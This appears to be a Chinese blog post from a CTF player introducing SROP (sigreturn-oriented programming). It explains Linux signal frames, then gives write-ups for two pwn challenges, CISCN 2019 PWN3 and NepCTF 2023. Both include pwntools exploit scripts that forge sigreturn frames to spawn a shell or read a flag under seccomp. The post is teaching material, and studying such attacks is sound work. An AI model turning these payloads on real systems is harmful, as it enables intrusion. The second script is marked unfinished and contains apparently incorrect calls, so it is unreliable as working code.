<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>初探srop | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>初探srop</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-12T23:25:04.000Z" id="date"> 2023-08-12</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-12T15:26:19.558Z" id="updated"> 2023-08-12</time></div></span></div></div><hr><div id="post-content"><p>signal 机制<br>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。<br>‘’’text<br>┌──(str1d3r㉿str1k3Gwindows)-[~]<br>└─$ kill -l</p>
<ol>
<li>SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP</li>
<li>SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1</li>
<li>SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM</li>
<li>SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP</li>
<li>SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ</li>
<li>SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR</li>
<li>SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3</li>
<li>SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8</li>
<li>SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13</li>
<li>SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12</li>
<li>SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7</li>
<li>SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2</li>
<li>SIGRTMAX-1  64) SIGRTMAX<br>‘’’<br>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
</ol>
<p>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<br>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext<br>x86<br>‘’’c<br>struct sigcontext<br>{<br>  unsigned short gs, __gsh;<br>  unsigned short fs, __fsh;<br>  unsigned short es, __esh;<br>  unsigned short ds, __dsh;<br>  unsigned long edi;<br>  unsigned long esi;<br>  unsigned long ebp;<br>  unsigned long esp;<br>  unsigned long ebx;<br>  unsigned long edx;<br>  unsigned long ecx;<br>  unsigned long eax;<br>  unsigned long trapno;<br>  unsigned long err;<br>  unsigned long eip;<br>  unsigned short cs, __csh;<br>  unsigned long eflags;<br>  unsigned long esp_at_signal;<br>  unsigned short ss, __ssh;<br>  struct _fpstate * fpstate;<br>  unsigned long oldmask;<br>  unsigned long cr2;<br>};<br>‘’’<br>x64<br>‘’’c<br>struct _fpstate<br>{<br>  &#x2F;* FPU environment matching the 64-bit FXSAVE layout.  *&#x2F;<br>  __uint16_t        cwd;<br>  __uint16_t        swd;<br>  __uint16_t        ftw;<br>  __uint16_t        fop;<br>  __uint64_t        rip;<br>  __uint64_t        rdp;<br>  __uint32_t        mxcsr;<br>  __uint32_t        mxcr_mask;<br>  struct _fpxreg    _st[8];<br>  struct _xmmreg    _xmm[16];<br>  __uint32_t        padding[24];<br>};</p>
<p>struct sigcontext<br>{<br>  __uint64_t r8;<br>  __uint64_t r9;<br>  __uint64_t r10;<br>  __uint64_t r11;<br>  __uint64_t r12;<br>  __uint64_t r13;<br>  __uint64_t r14;<br>  __uint64_t r15;<br>  __uint64_t rdi;<br>  __uint64_t rsi;<br>  __uint64_t rbp;<br>  __uint64_t rbx;<br>  __uint64_t rdx;<br>  __uint64_t rax;<br>  __uint64_t rcx;<br>  __uint64_t rsp;<br>  __uint64_t rip;<br>  __uint64_t eflags;<br>  unsigned short cs;<br>  unsigned short gs;<br>  unsigned short fs;<br>  unsigned short __pad0;<br>  __uint64_t err;<br>  __uint64_t trapno;<br>  __uint64_t oldmask;<br>  __uint64_t cr2;<br>  <strong>extension</strong> union<br>    {<br>      struct _fpstate * fpstate;<br>      __uint64_t __fpstate_word;<br>    };<br>  __uint64_t __reserved1 [8];<br>};<br>‘’’<br>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p>
<p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p>
<p>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。<br>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。<br>说到这里，其实，SROP 的基本利用原理也就出现了。<br>获取 shell<br>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。<br>system call chains<br>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可控制栈指针。把原来 rip 指向的syscall gadget 换成syscall; ret gadget。这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。<br>后续 ¶<br>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件<br>可以通过栈溢出来控制栈的内容<br>需要知道相应的地址<br>“&#x2F;bin&#x2F;sh”<br>Signal Frame<br>syscall<br>sigreturn<br>需要有够大的空间来塞下整个 sigal frame</p>
<p>以上介绍来自CTFwiki<br>pwntools已集成srop攻击</p>
<p>[CISCN 2019华南]PWN3 #复现环境ubuntu 20.04<br>‘’’text<br>str1k3@ubuntu:~&#x2F;Desktop$ checksec ‘&#x2F;var&#x2F;run&#x2F;vmblock-fuse&#x2F;blockdir&#x2F;P0SsCP&#x2F;pwn3’<br>[*] ‘&#x2F;var&#x2F;run&#x2F;vmblock-fuse&#x2F;blockdir&#x2F;P0SsCP&#x2F;pwn3’<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>‘’’<br>保护没特别的<br>‘’’c<br>signed __int64 vuln()<br>{<br>  signed __int64 v0; &#x2F;&#x2F; rax<br>  char buf[16]; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF</p>
<p>  v0 &#x3D; sys_read(0, buf, 0x400uLL);<br>  return sys_write(1u, buf, 0x30uLL); &#x2F;&#x2F;打印出栈地址<br>}<br>‘’’<br>给了gadget<br>‘’’text<br>.text:00000000004004D6                               public gadgets<br>.text:00000000004004D6                               gadgets proc near<br>.text:00000000004004D6                               ; __unwind {<br>.text:00000000004004D6 55                            push    rbp<br>.text:00000000004004D7 48 89 E5                      mov     rbp, rsp<br>.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh<br>.text:00000000004004E1 C3                            retn<br>.text:00000000004004E1<br>.text:00000000004004E1                               gadgets endp ; sp-analysis failed<br>.text:00000000004004E1<br>.text:00000000004004E2                               ; —————————————————————————<br>.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; ‘;’<br>.text:00000000004004E9 C3                            retn<br>.text:00000000004004E9<br>.text:00000000004004E9                               ; —————————————————————————<br>.text:00000000004004EA 90                            db 90h<br>.text:00000000004004EB                               ; —————————————————————————<br>.text:00000000004004EB 5D                            pop     rbp<br>.text:00000000004004EC C3                            retn<br>.text:00000000004004EC                               ; } &#x2F;&#x2F; starts at 4004D6<br>‘’’<br>有mov rax，0xf,显然进行srop<br>要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值bin_sh字符串的地址<br>需要把bin_sh写到栈上 然后利用write函数泄露栈地址</p>
<p>‘’’text<br>pwndbg&gt; x&#x2F;40gx 0x7fffffffe330<br>0x7fffffffe330:	0x6161616161616161*	0x000000000040050a<br>0x7fffffffe340:	0x00007fffffffe360	0x0000000000400536<br>0x7fffffffe350:	0x00007fffffffe458*	0x0000000100000000<br>0x7fffffffe360:	0x0000000000000000	0x00007ffff7de8083<br>0x7fffffffe370:	0x00007ffff7ffc620	0x00007fffffffe458<br>0x7fffffffe380:	0x0000000100000000	0x000000000040051d<br>0x7fffffffe390:	0x0000000000400540	0xb0a1866950c4d504<br>0x7fffffffe3a0:	0x00000000004003e0	0x00007fffffffe450<br>0x7fffffffe3b0:	0x0000000000000000	0x0000000000000000<br>0x7fffffffe3c0:	0x4f5e79969624d504	0x4f5e69d450aad504<br>0x7fffffffe3d0:	0x0000000000000000	0x0000000000000000<br>0x7fffffffe3e0:	0x0000000000000000	0x0000000000000001<br>0x7fffffffe3f0:	0x00007fffffffe458	0x00007fffffffe468<br>0x7fffffffe400:	0x00007ffff7ffe190	0x0000000000000000<br>0x7fffffffe410:	0x0000000000000000	0x00000000004003e0<br>0x7fffffffe420:	0x00007fffffffe450	0x0000000000000000<br>0x7fffffffe430:	0x0000000000000000	0x0000000000400409<br>0x7fffffffe440:	0x00007fffffffe448	0x000000000000001c<br>0x7fffffffe450:	0x0000000000000001	0x00007fffffffe6d4<br>0x7fffffffe460:	0x0000000000000000	0x00007fffffffe709<br>‘’’<br>输入的8字节的字母a位于0x7fffffffe330,0x7fffffffe350处有一个0x00007fffffffe458的地址可以泄露</p>
<p>‘’’python<br>from pwn import *<br>context(log_level&#x3D;’debug’,arch&#x3D;’amd64’, os&#x3D;’linux’)<br>#p &#x3D; process(“.&#x2F;pwn3”)<br>p &#x3D; remote(“node1.anna.nssctf.cn”,28856)<br>elf &#x3D; ELF(“.&#x2F;pwn3”)</p>
<p>syscall &#x3D; 0x400501<br>syscall_ret &#x3D; 0x400517<br>gadget &#x3D; 0x4004DA<br>vuln &#x3D; 0x4004ED<br>#泄露栈地址<br>p.send(b’a’*0x10+p64(vuln))<br>p.recv(0x20)<br>stack &#x3D; u64(p.recv(6).ljust(8,b’\x00’)) -0x118<br>print(“stack -&gt; “ + hex(stack))<br>#srop<br>frame &#x3D; SigreturnFrame()<br>frame.rax &#x3D; 59<br>frame.rdi &#x3D; stack<br>frame.rip &#x3D; syscall<br>frame.rsi &#x3D; 0</p>
<p>payload &#x3D; b”&#x2F;bin&#x2F;sh\x00”*0x2 + p64(gadget) + p64(syscall) + bytes(frame)<br>p.send(payload)<br>p.interactive()<br>‘’’</p>
<p>[NepCTF 2023] -srop  #wp待补充<br>‘’’ c<br>&#x2F;&#x2F;gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;syscall.h&gt;<br>#include &lt;seccomp.h&gt;<br>#include &lt;linux&#x2F;seccomp.h&gt;</p>
<p>char buf[0x30]&#x3D;”welcome to NepCTF2023!\n”;</p>
<p>int seccomp(){<br>    scmp_filter_ctx ctx;<br>    ctx &#x3D; seccomp_init(SCMP_ACT_KILL);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);<br>    seccomp_load(ctx);<br>    return 0;<br>}<br>&#x2F;&#x2F;沙盒</p>
<p>int sys(){<br>    return 15;<br>}&#x2F;&#x2F;syscall</p>
<p>int main(){<br>     char bd[0x30];<br>     seccomp();<br>     syscall(1,1,buf,0x30); &#x2F;&#x2F;write(“welcome to NepCTF2023!\n”)<br>     return syscall(0,0,bd,0x300);  &#x2F;&#x2F;read(bd,0x300)<br>}&#x2F;&#x2F;主函数<br>‘’’<br>查保护<br>‘’’<br>pwndbg&gt; checksec<br>[*] ‘&#x2F;home&#x2F;str1k3&#x2F;Desktop&#x2F;pwn’<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>‘’’</p>
<h1 id="‘’’asmstr1k3-ubuntu-Desktop-seccomp-tools-dump-pwn-line-CODE-JT-JF-K"><a href="#‘’’asmstr1k3-ubuntu-Desktop-seccomp-tools-dump-pwn-line-CODE-JT-JF-K" class="headerlink" title="‘’’asmstr1k3@ubuntu:~&#x2F;Desktop$ seccomp-tools dump .&#x2F;pwn line  CODE  JT   JF      K"></a>‘’’asm<br>str1k3@ubuntu:~&#x2F;Desktop$ seccomp-tools dump .&#x2F;pwn<br> line  CODE  JT   JF      K</h1><p> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch<br> 0001: 0x15 0x00 0x08 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0010<br> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number<br> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005<br> 0004: 0x15 0x00 0x05 0xffffffff  if (A !&#x3D; 0xffffffff) goto 0010<br> 0005: 0x15 0x03 0x00 0x00000000  if (A &#x3D;&#x3D; read) goto 0009<br> 0006: 0x15 0x02 0x00 0x00000001  if (A &#x3D;&#x3D; write) goto 0009<br> 0007: 0x15 0x01 0x00 0x00000002  if (A &#x3D;&#x3D; open) goto 0009<br> 0008: 0x15 0x00 0x01 0x0000000f  if (A !&#x3D; rt_sigreturn) goto 0010<br> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0010: 0x06 0x00 0x00 0x00000000  return KILL<br> ‘’’<br>沙盒，但是允许了orw</p>
<p> ‘’’text<br> pwndbg&gt; search flag<br>Searching for value: ‘flag’<br>libc-2.27.so    0x7ffff77d4a3b insb byte ptr [rdi], dx &#x2F;* ‘flags’ <em>&#x2F;<br>libc-2.27.so    0x7ffff77d7505 insb byte ptr [rdi], dx &#x2F;</em> ‘flags’ <em>&#x2F;<br>libc-2.27.so    0x7ffff77d7906 insb byte ptr [rdi], dx &#x2F;</em> ‘flags’ <em>&#x2F;<br>libc-2.27.so    0x7ffff79736a0 insb byte ptr [rdi], dx &#x2F;</em> ‘flags’ <em>&#x2F;<br>libc-2.27.so    0x7ffff7979b44 insb byte ptr [rdi], dx &#x2F;</em> ‘flags2 &amp; _IO_FLAGS2_FORTIFY’ <em>&#x2F;<br>libc-2.27.so    0x7ffff79b0282 ‘flags is not implemented and will always fail’<br>warning: Unable to access 16003 bytes of target memory at 0x7ffff79b0286, halting search.<br>warning: Unable to access 16003 bytes of target memory at 0x7ffff7bd1000, halting search.<br>ld-2.27.so      0x7ffff7df6421 insb byte ptr [rdi], dx &#x2F;</em> ‘flag)’ <em>&#x2F;<br>ld-2.27.so      0x7ffff7df6efe insb byte ptr [rdi], dx &#x2F;</em> ‘flag value(s) of 0x%x in DT_FLAGS_1.\n’ <em>&#x2F;<br>ld-2.27.so      0x7ffff7df77d4 insb byte ptr [rdi], dx &#x2F;</em> ‘flags &amp; ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) &#x3D;&#x3D; 0’ <em>&#x2F;<br>ld-2.27.so      0x7ffff7df844e insb byte ptr [rdi], dx &#x2F;</em> ‘flags_1 &amp; DF_1_NODELETE) &#x3D;&#x3D; 0’ *&#x2F;<br>‘’’</p>
<p>‘’’python<br>from pwn import *<br>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)</p>
<p>p &#x3D; process(‘.&#x2F;pwn’)<br>#p &#x3D; remote(‘node3.buuoj.cn’, 27151)​<br>libc &#x3D; ELF(‘.&#x2F;libc-2.27.so’)</p>
<p>puts_addr &#x3D; libc.dump(‘puts’)<br>log.info(hex(puts_addr))<br>libc_base &#x3D; puts_addr - libc.sym[‘puts’]<br>open_addr &#x3D; libc_base + libc.sym[‘open’]<br>read_addr &#x3D; libc_base + libc.sym[‘read’]<br>write_addr &#x3D; libc_base + libc.sym[‘write’]<br>pop_rdi_ret &#x3D; libc_base + 0x2164f<br>pop_rsi_ret &#x3D; libc_base + 0x23a6a<br>pop_rdx_ret &#x3D; libc_base + 0x01b96<br>bss &#x3D; libc_base + libc.bss()<br>rop_addr &#x3D; bss + 0x100</p>
<p>frame &#x3D; SigreturnFrame()<br>frame.rdi &#x3D; 0x0 # syscall 0 -&gt; read<br>frame.rsi &#x3D; rop_addr<br>frame.rdx &#x3D; 0x100<br>frame.rip &#x3D; read_addr<br>frame.rsp &#x3D; rop_addr<br>#相当于栈迁移到bss +0x100上进行rop<br>p.send(str(frame)[8:])</p>
<p>str_flag_addr &#x3D; rop_addr + 0x98 #0x98是为了让open读到flag的字符<br>payload &#x3D; p64(pop_rdi_ret) + p64(str_flag_addr) + p64(pop_rsi_ret) + p64(0x0) + p64(open_addr) # open(‘flag’)<br>payload +&#x3D; p64(pop_rdi_ret) + p64(0x3) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(0x30) + p64(read_addr) #read(3,bss,0x40) 3是因为open默认打开stdin-&gt;0 stdout-&gt;1 stderr-&gt;2，接下来打开就是3<br>payload +&#x3D; p64(pop_rdi_ret) + p64(0x1) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(0x30) + p64(write_addr) # write(1,bss,0x40)<br>payload +&#x3D; ‘flag\x00’<br>p.send(payload)<br>p.interactive()<br>‘’’</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/25/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">Linux保护机制 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%80%98%E2%80%99%E2%80%99asmstr1k3-ubuntu-Desktop-seccomp-tools-dump-pwn-line-CODE-JT-JF-K"><span class="toc-number">1.</span> <span class="toc-text">‘’’asmstr1k3@ubuntu:~&#x2F;Desktop$ seccomp-tools dump .&#x2F;pwn line  CODE  JT   JF      K</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>